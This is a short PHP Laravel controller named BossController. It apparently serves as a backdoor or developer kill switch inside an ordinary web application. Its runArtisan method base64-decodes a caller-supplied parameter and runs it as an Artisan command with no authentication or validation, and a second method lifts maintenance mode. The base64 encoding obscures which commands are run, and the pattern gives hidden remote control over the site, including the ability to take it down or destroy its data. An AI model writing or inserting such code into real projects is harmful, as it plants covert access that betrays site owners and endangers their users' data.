<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\Artisan;

class BossController extends Controller
{
    /**
     * Run an Artisan comman
     *
     */
    public function runArtisan($command)
    {
        Artisan::call(base64_decode($command));
    }

    /**
     * Disable maintenance mode
     *
     */
    public function unlockSite()
    {
        Artisan::call('up');
    }
}
